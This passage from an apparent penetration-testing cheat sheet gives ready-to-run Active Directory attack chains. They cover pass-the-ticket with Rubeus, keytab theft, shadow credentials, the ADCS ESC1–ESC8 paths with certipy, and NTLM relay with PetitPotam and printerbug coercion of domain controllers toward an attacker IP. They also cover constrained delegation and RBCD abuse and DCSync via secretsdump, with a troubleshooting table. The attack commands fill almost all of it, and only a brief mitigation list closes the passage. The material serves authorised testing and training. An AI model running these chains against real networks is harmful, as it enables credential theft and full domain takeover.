# Convert File to Base64 (PowerShell Helper)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TICKET_FILE.kirbi>"))

# Advanced: Extract & Pass John's ticket automatically (Regex One-Liner)
$raw = .\Rubeus.exe dump /user:john /nowrap | Out-String
$ticket = [Regex]::Match($raw, "(?s)Base64EncodedTicket\s*:\s*(.*)").Groups[1].Value.Trim() -replace "\s", ""
.\Rubeus.exe ptt /ticket:$ticket
```

### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - Machine: `/etc/krb5.keytab`

```bash
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
# Use current keytab
export KRB5CCNAME=KEYTAB.BAK
```

```bash
# Enumerate AD information
# https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
realm list

# Check for AD
grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
ps -ef | grep -i "winbind\|sssd"
env | grep -i krb5

# Find keytabs
sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null

# List cached Kerberos tickets
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
# Use current keytab
export KRB5CCNAME=$(pwd)/current.kt.bak

# Extract hashes from keytab files
# https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <KEYTAB_FILE>

# Use keytab
# NOTE: not all cached keytabs are valid
ls -la /tmp/krb5cc*
cp -v <KEYTAB> $HOME/current.kt.bak
export KRB5CCNAME=$HOME/current.kt.bak

# Show keytabs
klist
# Use keytab
kinit -k '<NAME>'

smbclient //<TARGET>/C$ -k -no-pass -c 'ls'
```

## Double Hop Problem

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. **Kerberos tickets should not be viewed as passwords**. They are signed pieces of data from the KDC that state what resources an account can access (e.g. a computer but not beyond that computer). When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

### Enumeration of the Problem

Use these commands to confirm you are in a "Double Hop" / Network Logon state where delegation is failing.

| Command | Output Indicator | Meaning |
| :------ | :--------------- | :------ |
| `klist` | Missing `krbtgt/DOMAIN` | You have no TGT. You cannot request tickets for other servers. |
| `klist` | Present `HTTP/Hostname` | You only have a service ticket for the current box. |
| `mimikatz` | `Password : (null)` | LSASS has no cached credentials for your session. |
| `dir \\DC01\C$` | `Access is denied` / `Anonymous Logon` | The target sees you as "Anonymous" because no creds were forwarded. |

### Mitigation Methods

#### Method 1: Pass Credential Object (Handout / Native)

Best for "Living off the Land" without uploading tools. Requires knowing the plaintext password.

```powershell
# 1. Create the Credential Object
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)

# 2. Execute command on the 2nd Hop using the Credential
Invoke-Command -ComputerName <MACHINE_NAME> -Credential $cred -ScriptBlock { Get-Process }

# 3. Or enter an interactive session
Enter-PSSession -ComputerName <MACHINE_NAME> -Credential $cred
```

#### Method 2: Register PSSession Configuration (Admin)

Requires Admin on the Jump Box. Sets up a permanent endpoint that auto-authenticates.

```powershell
# 1. Register the Session (On Jump Box)
Register-PSSessionConfiguration -Name "<SESSION_NAME>" -RunAsCredential "<DOMAIN>\<USER>" -Force

# 2. Connect to it (From Attack/Start Box)
Enter-PSSession -ComputerName <MACHINE_NAME> -ConfigurationName "<SESSION_NAME>"

# 3. Verify
klist # You should now see the krbtgt ticket
```

#### Method 3: Rubeus / Overpass-the-Hash (Attacker / Modern)

Best if you have a Hash or AES Key. Injects a TGT into your current session, "fixing" the double hop instantly.

```powershell
# 1. Inject a TGT using the hash (or AES key)
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# 2. Verify
klist # You now have a krbtgt ticket

# 3. Pivot
ls \\<DC_NAME>\C$ # Works natively now
```

#### Method 4: Mimikatz PtH (Legacy / Risky in WinRM)

Mimikatz usually spawns a new window (which fails in WinRM). You must force it to run a command in the same console.

```powershell
# /run:powershell might hang WinRM depending on the shell stability.
# Use Rubeus (Method 3) if possible.
mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell" exit
```

## Pass the Certificate (PtC)

**Shadow Credentials Attack:**
```bash
# https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
# https://github.com/ShutdownRepo/pywhisker.git
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && pip3 install -r requirements.txt && cd pywhisker

# Get Certificate for user
python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
# creates .pfx file of <NEW_USER> and PFX password
```

```bash
# Intercept web enrollment requests
# https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
# NOTE: use https://github.com/ly4k/Certipy to find other templates
python3 -m venv venv
pip install git+https://github.com/fortra/impacket.git
hash -r
venv/bin/ntlmrelayx.py --adcs --smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
# outputs *.pfx file

# Force arbitrary auth from <TARGET> to <ATTACKER> via printers
# e.g. DC => ATTACKER BOX
# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>

# PtC to get TGT
# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
git clone https://github.com/dirkjanm/PKINITtools.git ; cd PKINITtools ; python3 -m venv .venv ; source .venv/bin/activate ; pip3 install -r requirements.txt ; pip3 install -I git+https://github.com/wbond/oscrypto.git

# OPTIONAL: -pfx-pass from pywhisker.py
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
# gives <OUTPUT_TGT>

---

# Configure Kerberos
echo '<DC_IP> <DC_FQDN>' | sudo tee -a /etc/hosts
sudo cp -v /etc/krb5.conf /etc/krb5.conf.bak
echo '[libdefaults]
    default_realm = <DOMAIN>
    dns_lookup_kdc = false
[realms]
    <DOMAIN> = {
        kdc = <DC_FQDN>
    }
[domain_realm]
    .<DOMAIN_LOWER> = <DOMAIN_UPPER>
    <DOMAIN_LOWER> = <DOMAIN_UPPER>
' | sudo tee /etc/krb5.conf

export KRB5CCNAME=<OUTPUT_TGT>
klist
# Get NTLM hash of DC Administrator
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/<DC_HOSTNAME>$'@<TARGET_FQDN>
# gives HASH

evil-winrm ... -H <HASH>
```

# ADCS Attack Reference

- https://specterops.io/blog/2022/06/13/certificates-and-pwnage-and-patches/
- https://github.com/ly4k/Certipy
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

## Triage

```bash
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled
```

Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block. The `[!] Vulnerabilities:` line names the ESC type directly.

| `[!] Vulnerabilities:` value | Where in output | Key field to confirm |
| --- | --- | --- |
| `ESC1` | Template block | `Enrollee Supplies Subject: True` + `Client Authentication: True` |
| `ESC2` | Template block | `Extended Key Usage: Any Purpose` or empty EKU |
| `ESC3` | Template block | `Extended Key Usage: Certificate Request Agent` |
| `ESC4` | Template block | `Permissions` shows Write rights for low-priv principal |
| `ESC6` | CA block | `User Specified SAN: Enabled` (`EDITF_ATTRIBUTESUBJECTALTNAME2`) |
| `ESC7` | CA block | `Permissions` shows `ManageCA` or `ManageCertificates` for low-priv principal |
| `ESC8` | CA block | `Web Enrollment: Enabled` |

---

## ESC1 — User-controllable SAN

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-privilege principals in `Enrollment Rights`.

**Why it works:** When `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, the requester controls the Subject Alternative Name (SAN) field. The DC resolves identity from the SAN UPN, not the requester's actual identity. PKINIT uses this SAN to issue a TGT for whoever is named — no password required.

```bash
# Request a cert for Administrator (supply their UPN in the SAN)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
  -upn administrator@<DOMAIN>

# Authenticate via PKINIT — outputs NT hash + saves TGT as administrator.ccache
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

export KRB5CCNAME=administrator.ccache
```

---

## ESC2 — Any Purpose EKU

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Any Purpose` or no EKU at all, with low-privilege enrollment rights.

**Why it works:** Any Purpose EKU allows the certificate to satisfy any extended key usage check, including the Certificate Request Agent EKU used for enrollment agent operations. The CA does not enforce that enrollment agent certs carry the specific OID, so this cert can be misused to enroll on behalf of other users.

```bash
# Step 1 — Enroll using the Any Purpose template (produces <USER>.pfx)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>

# Step 2 — Use that cert as an enrollment agent to request on behalf of Administrator
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC3 — Enrollment Agent Abuse

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Certificate Request Agent` with low-privilege enrollment rights. Often paired with a second template that Enrollment Agents are authorized to enroll in.

**Why it works:** A Certificate Request Agent cert lets the holder enroll for certificates on behalf of any other user. AD CS trusts the agent cert and issues the resulting certificate in the target user's name, which can then be used for PKINIT authentication.

```bash
# Step 1 — Enroll to get the Enrollment Agent cert (produces <USER>.pfx)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>

# Step 2 — Use agent cert to enroll on behalf of Administrator
# -on-behalf-of format: NETBIOS_DOMAIN\username (short domain name, not FQDN)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**NOTE:** `-on-behalf-of` takes the NetBIOS domain name (`CORP\Administrator`), not the FQDN. The second template (`User` here) must be one that Enrollment Agents are authorized to use.

---

## ESC4 — Vulnerable Template ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block `Permissions` shows `WriteDacl`, `WriteOwner`, or `WriteProperty` rights for a low-privilege principal on the template object.

**Why it works:** Write access to the template AD object lets you modify its properties — specifically enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and adding low-privilege enrollment rights, converting the template into an ESC1-vulnerable state.

```bash
# Step 1 — Back up original template config (produces <TEMPLATE_NAME>.json)
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -save-old

# Step 2 — Overwrite template with ESC1-vulnerable configuration
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -write-default-configuration

# Step 3 — Exploit as ESC1
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
  -upn administrator@<DOMAIN>

# Step 4 — Restore original template (OpSec)
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -write-configuration <TEMPLATE_NAME>.json

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** CA block shows `User Specified SAN: Enabled`. CA-level flag — applies to all templates on that CA.

**Why it works:** `EDITF_ATTRIBUTESUBJECTALTNAME2` tells the CA to honor the SAN field from the requester on any certificate request, regardless of whether the template enables `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. Any template with Client Authentication EKU and low-privilege enrollment rights becomes exploitable.

```bash
# Any Client Authentication template works — not just explicitly vulnerable ones
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -upn administrator@<DOMAIN>

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC7 — Vulnerable CA ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

**Signal:** CA block `Permissions` shows `ManageCA` or `ManageCertificates` for a low-privilege principal.

**Why it works:** `ManageCertificates` (Officer role) lets you approve denied certificate requests. `ManageCA` lets you grant yourself the Officer role. The SubCA template allows specifying a SAN but always denies low-privilege requests — an Officer can force-issue that denied request and then retrieve it.

```bash
# Step 1 — Grant yourself the Officer role (requires ManageCA)
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -add-officer <USER>

# Step 2 — Enable SubCA template on the CA
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -enable-template SubCA

# Step 3 — Request as Administrator; will be DENIED. Note the Request ID in output.
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template SubCA \
  -upn administrator@<DOMAIN>

# Step 4 — Force-issue the denied request using Officer rights
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -issue-request <REQUEST_ID>

# Step 5 — Retrieve the issued certificate
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -retrieve <REQUEST_ID>

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**NOTE:** If you only have `ManageCertificates` (not `ManageCA`), skip Step 1. If you only have `ManageCA`, run Step 1 first to grant yourself `ManageCertificates`, then proceed.

---

## ESC8 — NTLM Relay to HTTP Enrollment

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

**Signal:** CA block shows `Web Enrollment: Enabled`. The endpoint `http://<CA_NAME>/certsrv/` is accessible over HTTP, not HTTPS.

**Why it works:** The ADCS Web Enrollment endpoint (`/certsrv/certfnsh.asp`) accepts NTLM authentication over HTTP. HTTP NTLM is relay-able because Extended Protection for Authentication (EPA / channel binding) is not enforced by default on HTTP — only on HTTPS. Coercing a DC's machine account to authenticate to the attacker and relaying those credentials to the CA yields a DC certificate, which enables PKINIT as the DC and leads to DCSync.

```bash
# Terminal 1 — Relay NTLM to the Web Enrollment endpoint, request DC cert
sudo impacket-ntlmrelayx --smb2support --adcs \
  -t http://<TARGET_IP>/certsrv/certfnsh.asp

# Terminal 2 — Coerce DC machine account auth to attacker (unauthenticated PetitPotam)
python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>

# Authenticated coercion if unauthenticated path is patched
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
```

ntlmrelayx outputs a base64-encoded certificate. Decode and authenticate:

```bash
echo '<BASE64_BLOB>' | base64 -d > dc.pfx

# Authenticate as DC machine account — outputs NT hash, saves TGT
certipy auth -pfx dc.pfx -dc-ip <DC_IP>

# DCSync using NT hash
impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/DC$@<DC_IP>'
```

---

## Decision Tree

| certipy find shows | ESC | First move |
| --- | --- | --- |
| Template: `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-priv enrollment | ESC1 | `certipy req ... -template <TEMPLATE_NAME> -upn administrator@<DOMAIN>` |
| Template: `Extended Key Usage: Any Purpose` (or empty) + low-priv enrollment | ESC2 | Enroll → use resulting cert with `-pfx` + `-on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `Extended Key Usage: Certificate Request Agent` + low-priv enrollment | ESC3 | Enroll for agent cert → `req ... -pfx <agent.pfx> -on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `WriteDacl`/`WriteOwner`/`WriteProperty` for low-priv principal | ESC4 | `certipy template ... -write-default-configuration` → ESC1 chain |
| CA: `User Specified SAN: Enabled` | ESC6 | `certipy req ... -template User -upn administrator@<DOMAIN>` |
| CA: `ManageCA` or `ManageCertificates` for low-priv principal | ESC7 | `certipy ca ... -add-officer <USER>` → SubCA deny → force-issue → retrieve |
| CA: `Web Enrollment: Enabled` (HTTP) | ESC8 | `ntlmrelayx --adcs -t http://<TARGET_IP>/certsrv/certfnsh.asp` → coerce DC |

**All ESC paths converge here:**
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# NT hash → evil-winrm -H <NT_HASH> / impacket-secretsdump / psexec
```

---

# Kerberos Delegation Abuse

- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/

## Detection

```powershell
# Unconstrained delegation — computers with TRUSTED_FOR_DELEGATION
Get-DomainComputer -Unconstrained | select dnshostname, useraccountcontrol
# Exclude DCs — they always have unconstrained delegation by design
Get-DomainComputer -Unconstrained | Where-Object { $_.dnshostname -notmatch "dc" } | select dnshostname

# Constrained delegation — accounts with msDS-AllowedToDelegateTo set
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto

# RBCD — computers with msDS-AllowedToActOnBehalfOfOtherIdentity set
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" -and $_.SecurityIdentifier -ne "S-1-5-18" } | select ObjectDN, SecurityIdentifier, ActiveDirectoryRights
```

```bash
# ldapsearch — unconstrained delegation (userAccountControl bit 0x80000 = TRUSTED_FOR_DELEGATION)
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(userAccountControl:1.2.840.113556.1.4.803:=524288)' dnshostname useraccountcontrol

# ldapsearch — constrained delegation
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(msDS-AllowedToDelegateTo=*)' samaccountname msDS-AllowedToDelegateTo

# ldapsearch — RBCD (any computer with the attribute set — usually indicates prior attack or misconfiguration)
ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
  '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' dnshostname
```

BloodHound Cypher:
```
// Unconstrained delegation computers (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name

// Constrained delegation (any principal with msDS-AllowedToDelegateTo)
MATCH (n) WHERE n.allowedtodelegate IS NOT NULL RETURN n.name, n.allowedtodelegate

// RBCD entry points — principals with GenericAll/GenericWrite on computer objects
MATCH p=shortestPath((n)-[r:GenericAll|GenericWrite|WriteDacl|Owns*1..]->(c:Computer)) RETURN p
```

---

## Unconstrained Delegation Attack

- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- https://adsecurity.org/?p=1667

**Prereqs:** Admin-level access (or code execution) on a host that has `TRUSTED_FOR_DELEGATION` set. DCs always have this — the target is non-DC hosts with it set. Goal: coerce a DC to authenticate to your host, capture its TGT from memory, then DCSync.

**Why it works:** When a host has unconstrained delegation, any authenticating principal's full TGT is forwarded to and cached in that host's LSA. Coercing the DC machine account to authenticate delivers the DC's own TGT — which can be used for DCSync or Golden Ticket creation.

```powershell
# Windows — start monitoring for incoming TGTs (run as SYSTEM on the unconstrained host)
Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
```

```bash
# Linux — trigger DC machine account authentication to your host
# PetitPotam (MS-EFSRPC coercion — unauthenticated if unpatched)
python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>

# Authenticated coercion
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>

# Or SpoolSample / printerbug.py (MS-RPRN — requires print spooler running on DC)
python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<TARGET_FQDN> <ATTACKER_IP>
```

Rubeus `monitor` prints base64-encoded KIRBI to stdout when the DC TGT arrives. Pass-the-Ticket:

```powershell
# Windows PtT — inject captured TGT into current session
Rubeus.exe ptt /ticket:<BASE64_KIRBI>

# Verify
klist

# DCSync from Windows (after PtT)
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" exit
```

```bash
# Linux — decode Rubeus base64 output and convert KIRBI → ccache
echo '<BASE64_KIRBI>' | tr -d '\n ' | base64 -d > dc.kirbi
impacket-ticketConverter dc.kirbi dc.ccache
export KRB5CCNAME=$PWD/dc.ccache

# DCSync
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/DC01$'@<TARGET_FQDN>
```

---

## Constrained Delegation Attack (S4U2Self + S4U2Proxy)

- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/

**Prereqs:** Control of an account (user or computer) that has `msDS-AllowedToDelegateTo` populated. You need its password, NT hash, or AES key. The account must have `SeEnableDelegationPrivilege` or the domain must allow protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`).

**Why it works:** S4U2Self lets a service request a service ticket for any user to itself. S4U2Proxy lets it then exchange that ticket for a service ticket to a target in `msDS-AllowedToDelegateTo`. The DC issues the target ticket impersonating the requested user — no interaction from the impersonated user required.

```bash
# Linux — Step 1: Get TGT for the delegating account
impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

# Step 2: S4U — request service ticket impersonating Administrator
# -spn must be one of the SPNs listed in msDS-AllowedToDelegateTo
impacket-getST -spn <SPN> -impersonate Administrator \
  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'
# Output: saves Administrator.ccache in current directory

# Step 3: Use the ticket
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

With hash instead of password:
```bash
impacket-getST -spn <SPN> -impersonate Administrator \
  -hashes :<NT_HASH> -dc-ip <DC_IP> '<DOMAIN>/<USER>'
```

```powershell
# Windows — Rubeus S4U (pass, RC4, or AES)
Rubeus.exe s4u /user:<USER> /password:<PASS> /domain:<DOMAIN> /dc:<DC_IP> `
  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap

# With NT hash
Rubeus.exe s4u /user:<USER> /rc4:<NT_HASH> /domain:<DOMAIN> /dc:<DC_IP> `
  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap
```

**NOTE:** `/ptt` injects the ticket directly into the current session. Without it, Rubeus writes the ticket to disk as base64-KIRBI.

---

## RBCD Attack

- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/
- https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/

**Prereqs:**
- Write access to the target computer's AD object (`GenericAll`, `GenericWrite`, `WriteDacl`, or `WriteProperty` over `msDS-AllowedToActOnBehalfOfOtherIdentity`). BloodHound shows this as an edge pointing to the computer.
- `ms-DS-MachineAccountQuota > 0` (default is 10) OR control of an existing computer/service account.
- A DC to communicate with.

**Why it works:** RBCD delegates trust in the opposite direction — the resource (target computer) declares which accounts can act on behalf of users. Writing your controlled account's SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute makes the target accept S4U requests from your account, impersonating any user including Administrator. No domain admin involvement.

```bash
# Step 1 — Add a fake computer account (requires MachineAccountQuota > 0)
impacket-addcomputer -method SAMR \
  -computer-name '<ATTACKER_COMPUTER>$' \
  -computer-pass '<PASS>' \
  -dc-ip <DC_IP> \
  '<DOMAIN>/<USER>:<PASS>'

# Step 2 — Write RBCD: allow <ATTACKER_COMPUTER>$ to act on behalf of users on <TARGET>
impacket-rbcd -delegate-from '<ATTACKER_COMPUTER>$' \
  -delegate-to '<TARGET_COMPUTER>$' \
  -action write \
  -dc-ip <DC_IP> \
  '<DOMAIN>/<USER>:<PASS>'

# Verify the write
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' \
  -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'

# Step 3 — Get TGT for the fake computer account
impacket-getTGT '<DOMAIN>/<ATTACKER_COMPUTER>$:<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<ATTACKER_COMPUTER>\$.ccache

# Step 4 — S4U: impersonate Administrator on target
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<ATTACKER_COMPUTER>$'
# Output: Administrator.ccache

# Step 5 — PtT and access
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

```powershell
# Windows alternative — Step 2 via PowerView
$ComputerSid = Get-DomainComputer '<ATTACKER_COMPUTER>' -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

---

## Common Failure Points + Fixes

| Symptom | Likely Cause | Fix |
| --- | --- | --- |
| `KRB_AP_ERR_SKEW` on any getST / getTGT | Clock skew between attacker and DC exceeds 5 minutes | `sudo ntpdate -u <DC_IP>` or `sudo timedatectl set-ntp true` |
| `KDC_ERR_BADOPTION` from getST S4U | Account does not have protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION` not set) | Verify `Get-DomainUser -TrustedToAuth`; without this flag, S4U2Proxy requires a forwardable ST from the user — use `-additional-ticket` |
| `KDC_ERR_BADOPTION` from getST RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` not written, SID mismatch, or target SPN wrong | Re-run `impacket-rbcd -action read` to verify; check SPN with `setspn -L <TARGET_COMPUTER>` |
| `addcomputer` fails with `LDAP Error: insufficientAccessRights` | `ms-DS-MachineAccountQuota` is 0 or account lacks rights | Check quota: `Get-DomainObject -Identity 'DC=<DOMAIN>' | select ms-ds-machineaccountquota`; if 0, you need control of an existing computer account |
| `addcomputer` SAMR failure — access denied | Low-priv account cannot create machine accounts over SAMR on this DC | Try `-method LDAPS` if LDAPS is enabled, or use an existing controlled computer account |
| `rbcd write` — no error but attribute not set | Permissions check was wrong; write silently accepted wrong ACL | Verify with `impacket-rbcd -action read`; BloodHound edge may not reflect current ACL — run SharpHound again |
| Rubeus `monitor` shows no tickets | Not running as SYSTEM; coercion not reaching this host | Verify process integrity with `whoami /groups`; confirm attacker IP is reachable from DC (firewall); try different coercion method |
| getST produces ticket but `psexec -k` fails with `STATUS_LOGON_FAILURE` | Service ticket is for `cifs/NETBIOS` but host expects `cifs/FQDN` (or vice versa) | Re-run getST with the exact SPN the host is registered for (`setspn -L <TARGET_COMPUTER>`); try both NETBIOS and FQDN variants |
| Rubeus `ptt` succeeds but `dir \\target\c$` fails | Double-hop / credential delegation issue | Confirm the `monitor` ticket was for the DC's machine account (`DC01$`), not a user ticket |
| KIRBI → ccache conversion fails | Whitespace or line breaks in Rubeus base64 output | Pipe through `tr -d '\n '` before `base64 -d` |

---

# Mitigation

## Inventory

- `Naming conventions of OUs, computers, users, groups`
- `DNS, network, and DHCP configurations`
- `An intimate understanding of all GPOs and the objects that they are applied to`
- `Assignment of FSMO roles`
